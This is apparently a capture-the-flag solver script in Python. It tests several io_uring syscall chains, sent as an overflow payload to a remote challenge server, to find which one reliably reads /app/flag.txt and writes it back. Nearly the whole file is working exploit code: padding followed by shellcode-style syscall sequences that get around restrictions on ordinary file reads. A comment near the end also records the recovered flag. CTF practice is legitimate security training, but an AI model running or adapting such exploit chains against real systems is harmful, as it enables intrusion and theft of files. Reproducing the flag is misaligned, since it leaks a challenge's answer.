#!/usr/bin/env python3
"""Find the minimal RELIABLE io_uring enter sequence that exfils the flag remote.

solve.py (off=-1, 2 enters READ->WRITE) returns zeros: the async file READ has not
landed by the time the WRITE runs. leak_read.py (off=-1, 3 enters with a gap) got the
flag. Here we A/B several enter sequences against the live server and report which
reliably returns grey{...}, so we can bake the winner into solve.py.

Run:  uv run python solve_exp.py [host] [port]
"""
import os, re, sys
from pwn import context, remote

context.arch = "amd64"
context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import solve as S

HOST = sys.argv[1] if len(sys.argv) > 1 else "elijah-balls.chal.zip"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32267
NEG1 = 0xFFFFFFFFFFFFFFFF


def prologue():
    c = S.writebytes(S.PATH, b"/app/flag.txt\x00")
    c += S.wsyscall(S.SYS_OPENAT2, S.AT_FDCWD, S.PATH, S.HOW, 24)          # fd 3
    c += S.setmem64(S.PARAMS + S.P_FLAGS, S.IORING_SETUP_NO_MMAP)
    c += S.setmem64(S.PARAMS + S.P_CQ_USER, S.RINGS)
    c += S.setmem64(S.PARAMS + S.P_SQ_USER, S.SQES)
    c += S.wsyscall(S.SYS_IO_URING_SETUP, 8, S.PARAMS, 0, 0)               # ring 4
    return c


def submit_idx(idx):
    """sq_array[0]=0 (reuse SQES[0]); head=idx tail=idx+1; submit 1, wait 1."""
    c = S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, 0)
    c += S.setmem64(S.RINGS + 0, ((idx + 1) << 32) | idx)
    c += S.wsyscall(S.SYS_IO_URING_ENTER, 4, 1, 1, S.IORING_ENTER_GETEVENTS)
    return c


def wait_only():
    """io_uring_enter(to_submit=0, min_complete=1, GETEVENTS) -> just wait a completion."""
    return S.wsyscall(S.SYS_IO_URING_ENTER, 4, 0, 1, S.IORING_ENTER_GETEVENTS)


def read_then(extra):
    """READ(off=-1) at idx0, then `extra` chain, then WRITE FILEBUF->fd1 at the next idx."""
    c = prologue()
    c += S.build_sqe(S.IORING_OP_READ, 3, S.FILEBUF, 0x100, NEG1, 0x1111)
    c += submit_idx(0)
    c += extra(1)               # extra returns (chain, next_idx)
    return c


def V_wait(n):
    """READ, n*wait, WRITE."""
    def build(next_idx):
        c = b"".join(wait_only() for _ in range(n))
        c += S.build_sqe(S.IORING_OP_WRITE, 1, S.FILEBUF, 0x100, 0, 0x2222)
        c += submit_idx(next_idx)
        return c
    return build


def V_leakstyle(next_idx):
    """READ, throwaway WRITE(RINGS->fd1), WRITE(FILEBUF->fd1) -- mirrors leak_read."""
    c = S.build_sqe(S.IORING_OP_WRITE, 1, S.RINGS, 0x40, 0, 0x3333)
    c += submit_idx(next_idx)
    c += S.build_sqe(S.IORING_OP_WRITE, 1, S.FILEBUF, 0x100, 0, 0x4444)
    c += submit_idx(next_idx + 1)
    return c


IOSQE_IO_LINK = 0x04


def sqe_full(idx, opcode, fd, addr, length, off=0, udata=0, flags=0):
    """64-byte sqe at SQES[idx] with IOSQE flags byte (offset 1)."""
    base = S.SQES + idx * 64
    q0 = (opcode & 0xFF) | ((flags & 0xFF) << 8) | ((fd & 0xFFFFFFFF) << 32)
    c = S.setmem64(base + 0, q0)
    c += S.setmem64(base + S.SQE_OFF, off & NEG1)
    c += S.setmem64(base + S.SQE_ADDR, addr)
    c += S.setmem64(base + S.SQE_LEN, length & 0xFFFFFFFF)
    c += S.setmem64(base + S.SQE_UDATA, udata)
    return c


def V_linked():
    """READ(IO_LINK)+WRITE in ONE submission; kernel orders them. min_complete=2."""
    c = prologue()
    c += sqe_full(0, S.IORING_OP_READ, 3, S.FILEBUF, 0x100, NEG1, 0x1111, IOSQE_IO_LINK)
    c += sqe_full(1, S.IORING_OP_WRITE, 1, S.FILEBUF, 0x100, 0, 0x2222, 0)
    c += S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, (1 << 32) | 0)   # sq_array[0]=0, [1]=1
    c += S.setmem64(S.RINGS + 0, (2 << 32) | 0)               # head=0 tail=2
    c += S.wsyscall(S.SYS_IO_URING_ENTER, 4, 2, 2, S.IORING_ENTER_GETEVENTS)
    return c


def shoot(chain):
    payload = b"A" * S.OFF + chain + S.wsyscall(231, 0)
    assert b"\n" not in payload, "payload has newline"
    io = remote(HOST, PORT, timeout=8)
    io.sendline(payload)
    d = io.recvall(timeout=8) or b""
    try: io.close()
    except Exception: pass
    m = re.search(rb"grey\{[^}]*\}", d)
    return len(d), (m.group(0).decode() if m else None)


VARIANTS = {
    "READ+leakstyle(2 writes)":    lambda: read_then(V_leakstyle),
    "READ+WRITE linked(IO_LINK)":  V_linked,
}

TRIALS = 5


def main():
    print(f"=== {HOST}:{PORT}  reliability ({TRIALS} trials each) ===")
    for name, mk in VARIANTS.items():
        ok = 0
        sizes = []
        for _ in range(TRIALS):
            try:
                n, flag = shoot(mk())
            except Exception:
                n, flag = -1, None
            sizes.append(n)
            if flag and flag.startswith("grey{"):
                ok += 1
        verdict = "RELIABLE" if ok == TRIALS else (f"{ok}/{TRIALS}" if ok else "no flag")
        print(f"[{verdict:9}] {name:30}  sizes={sizes}")
        #flag:grey{3l1t3_b4lL_kn0wLedge_is_just_more_syscalls}
    return 0


if __name__ == "__main__":
    sys.exit(main())
